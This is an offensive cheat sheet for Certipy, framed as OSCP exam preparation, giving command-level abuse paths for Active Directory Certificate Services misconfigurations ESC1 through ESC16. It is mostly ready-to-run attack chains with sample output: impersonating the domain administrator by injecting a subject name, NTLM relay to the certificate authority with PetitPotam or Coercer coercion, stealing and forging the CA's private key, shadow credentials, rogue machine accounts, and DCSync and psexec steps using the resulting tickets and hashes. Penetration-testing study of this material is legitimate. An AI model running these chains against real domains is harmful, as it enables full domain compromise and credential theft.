# Certipy ADCS Cheat Sheet — Enumeration & Abuse (OSCP-style)

Certipy (`ly4k/Certipy`, PyPI package `certipy-ad`) is the primary tool for enumerating and abusing Active Directory Certificate Services (AD CS / PKI) misconfigurations ("ESC1–ESC16"). This sheet covers the core sub-commands (`find`, `req`, `auth`, `shadow`, `account`) and gives command-level exploitation paths for ESC1–ESC8 in depth (§2–§3), with a reference-depth ESC9–ESC16 addendum in §6.

Install: `pip install certipy-ad` (invoked as `certipy` or `certipy-ad`).

---

## 0. Global / connection flags (apply to almost every sub-command)

| Flag | Purpose |
|---|---|
| `-u`/`-username user@domain` | Auth username (UPN or `-username` + `-domain`) |
| `-p`/`-password` | Password |
| `-hashes LM:NT` | Pass-the-hash |
| `-k` | Use Kerberos auth (needs valid TGT/ccache or `-aes`) |
| `-aes key` | AES key for Kerberos |
| `-no-pass` | Don't prompt for a password (e.g. Kerberos-only) |
| `-dc-ip x.x.x.x` | IP of a Domain Controller (LDAP target) |
| `-target-ip` / `-target hostname` | Target host for the actual CA/RPC/HTTP operation |
| `-ns` | Alternate nameserver for DNS resolution |
| `-dns-tcp` | Use TCP for DNS |
| `-ldap-scheme`, `-ldap-port`, `-no-ldap-channel-binding`, `-no-ldap-signing`, `-ldap-simple-auth` | LDAP connection tuning (needed against hardened DCs / LDAPS-only) |
| `-debug` | Verbose troubleshooting output |

---

## 1. Core sub-command quick reference

### `certipy find` — enumerate CAs, templates, ACLs
```
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128 -vulnerable -stdout
```
**Faster initial triage (nxc):** `nxc ldap <dc_ip> -u USER -p PASSWORD -M adcs` lists CAs and template names quickly before a full `certipy find` pass.
Key flags: `-text` (default, file), `-stdout` (print to console instead of file), `-json`, `-csv`, `-output prefix`, `-enabled` (only enabled templates), `-vulnerable` (only templates flagged exploitable given the caller's group memberships), `-oids` (issuance policy OIDs, relevant to ESC13/ESC15), `-hide-admins` (suppress noisy admin ACEs), `-dc-only` (LDAP-only, skip live CA RPC/HTTP checks — useful when CA is unreachable/firewalled), `-bloodhound` / `-old-bloodhound` (BloodHound-compatible export).

### `certipy req` — request/retrieve a certificate
```
certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template User
```
Key flags: `-ca name`, `-template name` (default `User`), `-upn`, `-dns`, `-sid`, `-subject` (SAN/subject injection for ESC1/ESC6), `-on-behalf-of 'DOMAIN\user'` (enrollment-agent abuse for ESC3), `-pfx file` (auth with a cert you already hold, e.g. the enrollment-agent cert), `-retrieve <reqID>` (pull a previously-pending/approved cert), `-key-size`, `-archive-key`/`-cax-cert` (key-archival relay abuse), `-out file`, `-web`/`-dcom`/`-dynamic-endpoint` (RPC transport choice).

### `certipy auth` — PKINIT authentication with a cert → TGT + NT hash
```
certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128
```
Key flags: `-pfx file`, `-password` (PFX password if set), `-username`/`-domain` (override identity, useful when the cert has no UPN or you're targeting cross-domain), `-no-hash` (skip UnPAC-the-hash NT hash retrieval), `-no-save` (don't write the `.ccache`), `-print`/`-kirbi` (dump TGT in kirbi format). By default it writes a `.ccache` file you can `export KRB5CCNAME=<file>.ccache` and hand to Impacket (`-k -no-pass`) or `secretsdump.py -k`.

### `certipy shadow` — Shadow Credentials (msDS-KeyCredentialLink) attack
```
certipy shadow auto -u john@corp.local -p Passw0rd -account Jane
```
Actions: `auto` (add key cred → PKINIT auth → retrieve NT hash/TGT → restore original attribute, one-shot), `list`, `add`, `remove`, `info`. Key flags: `-account target_sam` (account to target — requires `GenericWrite`/`GenericAll`/`WriteProperty` on that account's `msDS-KeyCredentialLink`), `-device-id` (target a specific key cred for `remove`), `-out file`.

### `certipy account` — AD account manipulation
```
certipy account update -u john@corp.local -p Passw0rd -user Jane -upn administrator
certipy account create -u john@corp.local -p Passw0rd -user EVIL$ -pass 'Passw0rd!'
certipy account delete -u john@corp.local -p Passw0rd -user EVIL$
```
Actions: `create`/`read`/`update`/`delete`. Key flags: `-user SAMAccountName`, `-upn`, `-dns` (dNSHostName — computer accounts), `-sam`, `-spns`, `-pass`, `-group` (target OU/group on create). Common real-world uses: (a) create a rogue computer account (abusing `ms-DS-MachineAccountQuota`, default 10/user) as a foothold for coercion/relay chains; (b) `-dns` spoofing of a computer account's `dNSHostName` you control, to impersonate a DC/server for Kerberos relay (bypasses SPN validation on the target you're pretending to be); (c) temporarily rewriting a victim's `-upn` to `administrator` to abuse weak UPN-based certificate mapping (ESC9/ESC10-style), then restoring it afterward.

---

## 2. ESC1–ESC8 Summary Table

| ESC | Misconfiguration | Certipy `find` detection | Exploit command sequence (short form) |
|---|---|---|---|
| **ESC1** | Template lets low-priv enrollees supply an arbitrary SAN (`Enrollee Supplies Subject: True`) + allows Client Authentication EKU + low-priv `Enrollment Rights` + no manager approval/auth-signatures required | `[!] Vulnerabilities: ESC1` printed under the template; text shows `Enrollee Supplies Subject: True`, `Client Authentication: True`, `Requires Manager Approval: False` | `certipy req -u user@corp.local -p pass -ca CA-NAME -target ca.corp.local -template VulnTemplate -upn administrator@corp.local -sid S-1-5-21-...-500` → `certipy auth -pfx administrator.pfx -dc-ip <dcip>` |
| **ESC2** | Template EKU = "Any Purpose" or no EKU defined at all (treated as usable for anything, incl. client auth or as an enrollment agent) | `[!] Vulnerabilities: ESC2`; text shows `Any Purpose: True` (or empty EKU list) | Request the cert, then either use it directly for client auth (if also ESC1-like) or use it as a stand-in enrollment-agent cert exactly like ESC3 below |
| **ESC3** | Template has the **Certificate Request Agent** EKU (`1.3.6.1.4.1.311.20.2.1`) enrollable by low-priv users → lets holder request certs *on behalf of* any other user | `[!] Vulnerabilities: ESC3`; text shows EKU `Certificate Request Agent`; look for a paired target template flagged `ESC3 Target Template` allowing enrollment-agent-signed requests | `certipy req -u user@corp.local -p pass -ca CA-NAME -target ca.corp.local -template EnrollmentAgentTemplate` (get agent cert) → `certipy req -u user@corp.local -p pass -ca CA-NAME -target ca.corp.local -template User -on-behalf-of 'CORP\Administrator' -pfx john.pfx` → `certipy auth -pfx administrator.pfx -dc-ip <dcip>` |
| **ESC4** | Low-priv principal has dangerous AD object rights on the **template object itself** (`WriteOwner`/`WriteDacl`/`WriteProperty`/`GenericAll`) → can reconfigure it into an ESC1-style template | `[!] Vulnerabilities: ESC4`; text shows `[+] User ACL Principals` / `Full Control Principals` for a low-priv group | `certipy template -u user@corp.local -p pass -template SecureTemplate -save-old -write-default-configuration` (backdoors it to ESC1 config) → `certipy req ... -template SecureTemplate -upn administrator@corp.local` → `certipy auth -pfx ... ` → restore: `certipy template -u user@corp.local -p pass -template SecureTemplate -configuration SecureTemplate.json` |
| **ESC5** | Low-priv write access to **other PKI AD objects** in the Configuration NC (CA computer object, `pKIEnrollmentService`, AIA/`NTAuthCertificates` containers, CDP objects) — a broad catch-all that can lead to CA compromise | Not directly flagged by `find -vulnerable`; found via ACL review on `CN=Public Key Services,CN=Services,CN=Configuration,DC=...` (BloodHound / `dacledit` / manual LDAP ACL enum) | Varies by object; end goal is usually stealing/backing up the CA's private key: `certipy ca -ca CORP-CA -backup -u admin@corp.local -p pass -target ca.corp.local` → `certipy forge -ca-pfx CORP-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'` → `certipy auth -pfx administrator_forged.pfx -dc-ip <dcip>` |
| **ESC6** | CA-wide flag `EDITF_ATTRIBUTESUBJECTALTNAME2` set → any template accepts a caller-supplied SAN in the request attributes, bypassing per-template restrictions (largely mitigated by the May 2022 KB5014754 hardening unless combined with ESC9/ESC10/ESC16, i.e. the SID security extension is missing) | `[!] Vulnerabilities: ESC6`; text shows `User Specified SAN: Enabled` at the CA level | `certipy req -u user@corp.local -p pass -ca CA-NAME -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500` (any enrollable template, SAN injected via request attribute) → `certipy auth -pfx administrator.pfx -dc-ip <dcip>` |
| **ESC7** | Low-priv principal holds `ManageCA` (CA Administrator) and/or `ManageCertificates` (Certificate Manager/Officer) rights on the **CA object** | `[!] Vulnerabilities: ESC7`; text shows `Access Rights` → `ManageCa: <principal>` / `ManageCertificates: <principal>` | `certipy ca -ca CORP-CA -u user@corp.local -p pass -target ca.corp.local -enable-template SubCA` → `certipy req -u user@corp.local -p pass -ca CORP-CA -target ca.corp.local -template SubCA -upn administrator@corp.local` (request goes pending — SubCA requires manager approval) → `certipy ca -ca CORP-CA -u user@corp.local -p pass -target ca.corp.local -issue-request <reqID>` (needs `ManageCertificates`) → `certipy req -u user@corp.local -p pass -ca CORP-CA -target ca.corp.local -retrieve <reqID>` → `certipy auth -pfx administrator.pfx -dc-ip <dcip>` |
| **ESC8** | CA Web Enrollment (`certsrv`/`certfnsh.asp`) is enabled over HTTP without EPA/channel binding, and NTLM is usable → coerce a privileged host (DC, server) to authenticate to attacker, relay that NTLM auth to the CA's HTTP enrollment endpoint | `[!] Vulnerabilities: ESC8` when web enrollment endpoint is enumerable; text shows `Web Enrollment: Enabled` under the CA. (Certipy itself doesn't detect the coercion angle — that's separate recon, e.g. `find` shows the vulnerable interface, coercion tools trigger the auth) | `certipy relay -target 'http://ca.corp.local/certsrv/'` (listener) → trigger auth from victim (e.g. `PetitPotam.py <attacker_ip> <victim_dc>` or `coercer coerce`) → cert dumped automatically → `certipy auth -pfx administrator_dc.pfx -dc-ip <dcip>` |

Notes:
- `-vulnerable` in `find` filters to templates the *authenticated principal* (or groups it's a nested member of) can actually enroll in and abuse — always also run a plain `find` (no `-vulnerable`) once to see the full picture, since ACL misconfigs (ESC4/ESC7) affecting `Everyone`/`Authenticated Users`/`Domain Users` will still show.
- Since KB5014754 (May 2022) and the follow-up November 2022 patch, DCs default to `Compatibility`/`Full Enforcement` certificate mapping, which weakens ESC1/ESC6/ESC8 unless the forged cert carries the `szOID_NTDS_CA_SECURITY_EXT` SID extension or you pass `-sid` — Certipy adds this automatically when `-sid` is given, and warns in `find` output if a template is only exploitable pre-patch.

---

## 2b. ESC9–ESC13 Summary Table

These target the same weak-certificate-mapping and issuance-policy gaps that KB5014754 partially closed — ESC9/ESC10 exploit the *absence* of the SID security extension rather than relaying around it, and ESC11–ESC13 cover additional RPC/HSM/issuance-policy vectors documented after the original Certified Pre-Owned taxonomy.

| ESC | Misconfiguration | Exploit command sequence (short form) |
|---|---|---|
| **ESC9** | Template has `CT_FLAG_NO_SECURITY_EXTENSION` set (no SID embedded in the cert) + weak certificate mapping on the DC. Requires `GenericWrite` on the victim account. | Temporarily flip victim's UPN to the target's UPN, request cert as victim, restore UPN, authenticate: `certipy account update -u attacker@domain -p pass -user victim -upn administrator@domain -dc-ip <IP>` → `certipy req -u victim@domain -p victimpass -ca CA_NAME -template ESC9template -dc-ip <IP>` → restore original UPN → `certipy auth -pfx victim.pfx -dc-ip <IP>` |
| **ESC10** | Weak certificate-mapping **registry keys** (`CertificateMappingMethods`/`StrongCertificateBindingEnforcement`) on the DC itself, rather than a template flag | Same UPN-swap technique as ESC9, but targets the DC's cert-mapping configuration rather than a specific template |
| **ESC11** | CA's ICPR RPC endpoint doesn't enforce `IF_ENCRYPT` → NTLM relay to RPC instead of HTTP (bypasses the EPA/channel-binding mitigations that closed most of ESC8 over HTTP) | `certipy relay -target 'rpc://<CA_host>' -ca CA_NAME -template DomainController` or `ntlmrelayx.py -t rpc://<CA_IP> -rpc-mode ICPR -icpr-ca-name 'CA_NAME' -smb2support --template DomainController` |
| **ESC12** | CA private key stored on an accessible smart-card HSM/registry-protected store — a shell on the CA server itself equals full PKI compromise | Post-exploitation credential/key extraction via `certutil`/DPAPI once you have code execution on the CA host, then `certipy ca -backup` |
| **ESC13** | Certificate template's issuance policy OID is linked (via `msPKI-Certificate-Policy` → `msDS-OIDToGroupLink`) to a privileged AD group | `certipy find -u 'user@domain' -p 'password' -dc-ip <IP> -vulnerable -stdout` (look for the OID→group link) → `certipy req -u 'user@domain' -p 'password' -ca CA_NAME -template TEMPLATE_NAME` → `certipy auth -pfx cert.pfx` to inherit the linked group's access |

**Reference:** https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation · https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html · https://www.hackingarticles.in/adcs-esc9-no-security-extension/ · https://www.hackingarticles.in/adcs-esc11-relaying-ntlm-to-icpr/ · https://adminions.ca/books/adcs/page/esc13

---

## 2c. ESC14–ESC16 Summary Table

| ESC | Misconfiguration | Certipy `find` detection | Exploit command sequence (short form) |
|---|---|---|---|
| **ESC14** | Weak **explicit certificate mapping** — a target account's `altSecurityIdentities` attribute maps it to a certificate an attacker can obtain/forge (X509IssuerSerialNumber/X509SubjectOnly/X509RFC822 mapping types can be spoofed) | `[!] Vulnerabilities: ESC14` on the account; `find` flags weak `altSecurityIdentities` mapping types | Enumerate the victim's `altSecurityIdentities` value, obtain/forge a certificate matching the weak mapping, then `certipy auth -pfx forged.pfx -username victim -domain corp.local -dc-ip <dcip>` |
| **ESC15 (CVE-2024-49019, "EKUwu")** | V1 template with `Enrollee Supplies Subject` allows a requester to inject an arbitrary **Application Policy** (incl. Client Authentication / Certificate Request Agent) into the CSR even though the template doesn't define that EKU, bypassing V1's normally-fixed EKU set | `[!] Vulnerabilities: ESC15` on a V1 template; `find` notes schema version 1 + enrollee-supplied-subject | `certipy req -u user@corp.local -p pass -ca CA-NAME -target ca.corp.local -template WebServer -application-policies 'Client Authentication' -upn administrator@corp.local -sid S-1-5-21-...-500` → `certipy auth -pfx administrator.pfx -dc-ip <dcip>` |
| **ESC16** | CA-wide flag disables the `szOID_NTDS_CA_SECURITY_EXT` security extension globally (`msPKI-Enrollment-Flag` / registry `DisableExtensionList` includes the security-extension OID) → **every** issued cert lacks the SID extension regardless of template, re-opening ESC1/ESC9/ESC10-style UPN-swap attacks CA-wide | `[!] Vulnerabilities: ESC16`; `find` shows the CA-level flag disabling the security extension | Same UPN-swap technique as ESC9/ESC10, but works against **any** enrollable template on the CA (no per-template weakness needed): `certipy account update -u attacker@domain -p pass -user victim -upn administrator@domain -dc-ip <IP>` → `certipy req -u victim@domain -p victimpass -ca CA_NAME -template User -dc-ip <IP>` → restore UPN → `certipy auth -pfx victim.pfx -dc-ip <IP>` |

**Reference:** https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation · https://research.ifcr.dk/certipy-4-8-esc15-and-more-b3ffcb15e97e (EKUwu / ESC15) · https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019

---

## 3. Worked examples

### 3.1 ESC1 — Enrollee-supplied subject, client-auth template

**Enumerate:**
```bash
certipy find -u lowpriv@corp.local -p 'Passw0rd!' -dc-ip 10.10.10.10 -vulnerable -stdout
```
Look for output like:
```
Certificate Templates
  0
    Template Name                       : VulnUserCert
    ...
    Enrollee Supplies Subject           : True
    Client Authentication               : True
    Requires Manager Approval           : False
    Authorized Signatures Required      : 0
    Enrollment Rights                   : CORP.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC1                              : 'CORP.LOCAL\\Domain Users' can enroll and specify a subject, template allows client authentication
```

**Request a cert impersonating Domain Admin (via UPN + explicit SID for strong-mapping compliance):**
```bash
certipy req -u lowpriv@corp.local -p 'Passw0rd!' \
  -ca 'CORP-CA' -target ca.corp.local \
  -template VulnUserCert \
  -upn administrator@corp.local \
  -sid S-1-5-21-3239415629-1108232037-1746813551-500
```
This saves `administrator.pfx`.

**Authenticate with the cert (PKINIT → TGT + NT hash):**
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```
Output gives the Domain Admin's `.ccache` and NT hash directly:
```
[*] Using principal: administrator@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

**Use the loot:**
```bash
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local
# or PtT lateral movement:
impacket-psexec -k -no-pass corp.local/administrator@dc01.corp.local
```

### 3.2 ESC3 — Enrollment Agent abuse

**Enumerate** — confirm the agent template and its target:
```bash
certipy find -u lowpriv@corp.local -p 'Passw0rd!' -dc-ip 10.10.10.10 -vulnerable -stdout
```
```
Template Name                   : EnrollmentAgent
Extended Key Usages             : Certificate Request Agent
Enrollment Rights               : CORP.LOCAL\Domain Users
[!] Vulnerabilities
  ESC3                          : 'CORP.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU
[*] Remarks
  ESC3 Target Template          : 'User' allows enrollment-agent-based requests
```

**Get the enrollment-agent certificate:**
```bash
certipy req -u lowpriv@corp.local -p 'Passw0rd!' \
  -ca 'CORP-CA' -target ca.corp.local -template EnrollmentAgent
```
Saves `lowpriv.pfx`.

**Request a User-template cert on behalf of Administrator, signed with the agent cert:**
```bash
certipy req -u lowpriv@corp.local -p 'Passw0rd!' \
  -ca 'CORP-CA' -target ca.corp.local -template User \
  -on-behalf-of 'CORP\Administrator' -pfx lowpriv.pfx
```
Saves `administrator.pfx`.

**Authenticate:**
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### 3.3 ESC8 — NTLM relay to CA HTTP enrollment endpoint

**Confirm HTTP web enrollment is up:**
```bash
certipy find -u lowpriv@corp.local -p 'Passw0rd!' -dc-ip 10.10.10.10 -stdout
```
```
Certificate Authorities
  0
    CA Name                         : CORP-CA
    ...
    Web Enrollment
      HTTP                          : Enabled
    [!] Vulnerabilities
      ESC8                          : Web Enrollment is enabled over HTTP without channel binding, and NTLM relay is possible
```

**Start Certipy's relay listener targeting the CA's cert-enrollment endpoint** (choose a template you can enroll in and that grants client auth, e.g. `Machine`/`DomainController`):
```bash
sudo certipy relay -target 'http://ca.corp.local' -template DomainController
```
(Certipy's `relay` command speaks the ADCS Web Enrollment protocol itself — no separate `ntlmrelayx.py` needed unless you want the RPC/`ICertPassage` path.)

**Coerce an authentication from a target (e.g. the Domain Controller) to your relay listener**, e.g. with PetitPotam or Coercer:
```bash
python3 PetitPotam.py -u lowpriv -p 'Passw0rd!' -d corp.local <attacker_ip> <dc-hostname>
# or
coercer coerce -l <attacker_ip> -u lowpriv -p 'Passw0rd!' -d corp.local -t <dc-ip>
```

**Certipy prints the issued cert on success** (auto-saved as `<target>.pfx`, e.g. `dc01.pfx`).

**Authenticate as the machine account and get its NT hash / TGT:**
```bash
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10
```

**From there:** if you relayed as a DC machine account you typically pivot straight to DCSync:
```bash
export KRB5CCNAME=dc01.ccache
impacket-secretsdump -k -no-pass corp.local/'DC01$'@dc01.corp.local -just-dc
```

---

## 4. Bonus: Shadow Credentials worked example

Precondition: you (or a group you're in) hold `GenericWrite`/`GenericAll`/`WriteProperty` on the target's `msDS-KeyCredentialLink` attribute (common when abusing delegated AD object rights, unrelated to ADCS templates but part of the same cert-based auth primitive).

```bash
certipy shadow auto -u lowpriv@corp.local -p 'Passw0rd!' -account Jane
```
This: (1) adds a new Key Credential to `Jane`'s `msDS-KeyCredentialLink`, (2) performs PKINIT with the injected cert to retrieve Jane's TGT + NT hash, (3) restores the original attribute value to reduce forensic footprint. Output gives Jane's NT hash directly, usable for pass-the-hash/secretsdump.

Manual (staged) version:
```bash
certipy shadow add -u lowpriv@corp.local -p 'Passw0rd!' -account Jane        # add key cred, get .pfx
certipy auth -pfx Jane.pfx -dc-ip 10.10.10.10                                # PKINIT -> TGT + hash
certipy shadow remove -u lowpriv@corp.local -p 'Passw0rd!' -account Jane -device-id <id>  # cleanup
```

---

## 5. Bonus: `account` command for chained abuse

Create a rogue computer account (uses your `ms-DS-MachineAccountQuota`, default 10) as a foothold for coercion/relay attacks or ESC8 requests requiring a machine identity:
```bash
certipy account create -u lowpriv@corp.local -p 'Passw0rd!' -user 'EVILPC$' -pass 'Passw0rd123!'
```
Point its `dNSHostName` at another host you want to relay as (SPN/Kerberos relay prep) — needs write access to that computer object's own `dNSHostName`/`servicePrincipalName`, only legal on an account you control:
```bash
certipy account update -u 'EVILPC$' -p 'Passw0rd123!' -user 'EVILPC$' -dns dc01.corp.local
```
Clean up after the engagement:
```bash
certipy account delete -u lowpriv@corp.local -p 'Passw0rd!' -user 'EVILPC$'
```

---

## 6. ESC9–ESC16 Reference Addendum

Reference-depth, not worked-example-depth: real commands per technique, without the full step-by-step of §3. All eight postdate the original "Certified Pre-Owned" ESC1–ESC8 taxonomy and mostly target the weak-mapping/issuance-policy gaps KB5014754 didn't fully close. Baseline detection pass for all of them:
```bash
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128 -vulnerable -stdout
```
**Faster (nxc):** `nxc ldap <dc_ip> -u USER -p PASSWORD -M adcs` — same as the §1 triage callout: lists CAs/templates fast but doesn't itself emit ESC9–ESC16 labels, so still follow up with the full `certipy find -vulnerable` pass below for the specific finding text.

### ESC9 — No Security Extension (`CT_FLAG_NO_SECURITY_EXTENSION`)
**Explanation:** Template is issued without the `szOID_NTDS_CA_SECURITY_EXT` SID extension. On its own this is inert post-KB5014754, but combined with `StrongCertificateBindingEnforcement` left at the default (`1`, Compatibility) on the DC and `GenericWrite` over some victim account, you can temporarily point the victim's UPN at a privileged target, enroll as the victim, and get back a cert that maps by UPN instead of SID. `find -vulnerable` prints `ESC9` under the template's `[!] Vulnerabilities`; raw output shows `No Security Extension : True`.
```bash
certipy account update -u attacker@corp.local -p Passw0rd -user Jane -upn administrator@corp.local
certipy req -u Jane@corp.local -p JanePass -ca corp-DC-CA -template ESC9-Template -dc-ip 172.16.126.128
certipy account update -u attacker@corp.local -p Passw0rd -user Jane -upn Jane@corp.local   # restore
certipy auth -pfx jane.pfx -domain corp.local -dc-ip 172.16.126.128
```
**Reference:** https://www.hackingarticles.in/adcs-esc9-no-security-extension/

### ESC10 — Weak certificate mapping (DC registry, not a template flag)
**Explanation:** Two independent DC-side registry weaknesses, either of which lets a UPN-spoofed cert authenticate regardless of what the template looks like. Case 1 (Schannel/TLS client-cert auth, e.g. LDAPS): `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel\CertificateMappingMethods` includes the UPN bit (`0x4`). Case 2 (Kerberos PKINIT): `HKLM\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement` = `0`. Reading either requires remote registry access to the DC (typically already-elevated), e.g. via Impacket:
```bash
impacket-reg corp.local/attacker:Passw0rd@dc01.corp.local query \
  -keyName 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel' -v CertificateMappingMethods
impacket-reg corp.local/attacker:Passw0rd@dc01.corp.local query \
  -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Kdc' -v StrongCertificateBindingEnforcement
```
Case 2 exploit — identical UPN-swap flow to ESC9, but works against **any** enrollable client-auth template (the DC-wide registry key is what's weak, not the template flag):
```bash
certipy account update -u attacker@corp.local -p Passw0rd -user Jane -upn administrator@corp.local
certipy req -u Jane@corp.local -p JanePass -ca corp-DC-CA -template User -dc-ip 172.16.126.128
certipy account update -u attacker@corp.local -p Passw0rd -user Jane -upn Jane@corp.local   # restore
certipy auth -pfx jane.pfx -domain corp.local -dc-ip 172.16.126.128
```
Case 1 exploit — same UPN-spoofed cert, but authenticate over Schannel (LDAPS) instead of PKINIT, dropping into Certipy's built-in LDAP shell:
```bash
certipy auth -pfx jane.pfx -domain corp.local -ldap-shell -dc-ip 172.16.126.128
```
**Reference:** https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation

### ESC11 — NTLM relay to ICPR RPC (no Extended Protection for Authentication)
**Explanation:** The CA's `ICertPassage` (ICPR) RPC endpoint doesn't require `IF_ENCRYPT`, so NTLM auth to it can be relayed the same way ESC8 relays to the HTTP enrollment endpoint — this route survives the EPA/channel-binding fixes that closed most of ESC8. `find -stdout` shows `Enforce Encryption for Requests : Disabled` under the CA; `-vulnerable` labels it `ESC11`.
```bash
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128 -vulnerable -stdout
certipy relay -target 'rpc://ca.corp.local' -ca corp-DC-CA -template DomainController
```
Then coerce a privileged host to authenticate to the listener — same coercion primitives as ESC8 §3.3 (PetitPotam/Coercer), just landing on the RPC listener instead of HTTP.
**Reference:** https://www.hackingarticles.in/adcs-esc11-relaying-ntlm-to-icpr/

### ESC12 — CA private key access (YubiHSM PIN / weak CA host ACLs)
**Explanation:** If the CA's private key is HSM-protected (commonly YubiHSM) and the authentication PIN is stored in a registry value readable by CA server admins (`HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-Name>\CSP\PIN`), or the CA host's local-admin group is weakly delegated, local admin on the CA server equals full CA compromise regardless of AD-level `ManageCA` rights. Certipy `find` does not detect this (it's a host-level issue) — enumerate the registry value / local admins once you have a foothold on the CA box.
```bash
reg query "HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\corp-DC-CA\CSP\PIN"
certutil -exportPFX -p "" My "corp-DC-CA" ca-backup.pfx
# or, once you hold local admin on the CA host:
certipy ca -ca 'corp-DC-CA' -backup -u administrator@corp.local -p Passw0rd -target ca.corp.local
certipy forge -ca-pfx corp-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
**Reference:** https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation

### ESC13 — Issuance policy linked to a privileged group
**Explanation:** A template's issuance policy OID (`msPKI-Certificate-Policy`) is linked via `msDS-OIDToGroupLink` to a privileged AD group. Enrolling and authenticating with the resulting cert gets you treated as a member of that group (subject to `StrongCertificateBindingEnforcement`/group-membership evaluation on the DC). `find -oids -vulnerable` surfaces the OID→group link directly; `-vulnerable` labels it `ESC13`.
```bash
certipy find -u user@corp.local -p Passw0rd -dc-ip 172.16.126.128 -vulnerable -oids -stdout
certipy req -u user@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template Esc13Template
certipy auth -pfx user.pfx -dc-ip 172.16.126.128
```
**Reference:** https://adminions.ca/books/adcs/page/esc13

### ESC14 — Explicit certificate mapping (`altSecurityIdentities` abuse)
**Explanation:** A target account's `altSecurityIdentities` attribute contains a weak explicit mapping (`X509IssuerSerialNumber`, `X509SubjectOnly`, `X509RFC822`, or an implicit/weak issuer entry) to a certificate an attacker can obtain or forge. `find -vulnerable` labels affected accounts `ESC14` with the weak mapping type named in the finding. Dump the mapping, then get (or forge, if you already control a CA) a cert that satisfies it:
```bash
certipy account read -u user@corp.local -p Passw0rd -user victim -dc-ip 172.16.126.128
# X509SubjectOnly-style weak mapping — enroll any ESC1-capable template with a matching Subject:
certipy req -u user@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local \
  -template VulnUserCert -subject 'CN=victim'
certipy auth -pfx victim.pfx -username victim -domain corp.local -dc-ip 172.16.126.128
```
**Reference:** https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation

### ESC15 / EKUwu (CVE-2024-49019) — Schema V1 template, attacker-controlled Application Policies
**Explanation:** A Schema V1 template with `Enrollee Supplies Subject` lets a requester inject an arbitrary Application Policy OID (e.g. Client Authentication, or Certificate Request Agent) into the CSR even though the template never defines that EKU — V1 templates were assumed to have a fixed, non-attacker-controlled EKU set, so this bypasses per-template EKU restrictions on any enrollable V1 template. `find -vulnerable` labels it `ESC15`, noting schema version 1 + enrollee-supplied-subject. Certipy 4.8+ supports it directly via `-application-policies`.
```bash
certipy req -u user@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local \
  -template WebServer -application-policies 'Client Authentication' \
  -upn administrator@corp.local -sid S-1-5-21-...-500
certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128
```
Same primitive also chains into ESC3: inject `Certificate Request Agent` instead of `Client Authentication` to mint an enrollment-agent cert off a V1 template that was never meant to allow it, then use it for `-on-behalf-of` requests exactly as in §3.2.
**Reference:** https://research.ifcr.dk/certipy-4-8-esc15-and-more-b3ffcb15e97e · https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019

### ESC16 — Security Extension disabled CA-wide
**Explanation:** The CA-level `msPKI-Enrollment-Flag`/registry `DisableExtensionList` includes the security-extension OID, so **every** cert the CA issues lacks the SID extension regardless of template — a server-wide version of ESC9 that reopens UPN-swap attacks against any enrollable template, no per-template weakness needed. `find -vulnerable` labels it `ESC16` at the CA level (not per-template).
```bash
certipy account update -u attacker@corp.local -p Passw0rd -user Jane -upn administrator@corp.local
certipy req -u Jane@corp.local -p JanePass -ca corp-DC-CA -template User -dc-ip 172.16.126.128
certipy account update -u attacker@corp.local -p Passw0rd -user Jane -upn Jane@corp.local   # restore
certipy auth -pfx jane.pfx -domain corp.local -dc-ip 172.16.126.128
```
**Reference:** https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation

**Exam scope note:** none of ESC9–ESC16 have (or need) a Metasploit path — every technique above is Certipy/Impacket/native `reg`/`certutil`, all fully exam-legal against the AD set. Where a coercion step is needed (ESC11), use PetitPotam/Coercer as in §3.3, not `auxiliary/scanner/*` Metasploit coercion modules.

---

## References
- [ly4k/Certipy GitHub repo & README](https://github.com/ly4k/Certipy)
- [Certipy Wiki – 05 Usage](https://github.com/ly4k/Certipy/wiki/05-‐-Usage), [08 Command Reference](https://github.com/ly4k/Certipy/wiki/08-‐-Command-Reference), [06 Privilege Escalation](https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation)
- SpecterOps, "Certified Pre-Owned" (original ESC1–ESC8 taxonomy)
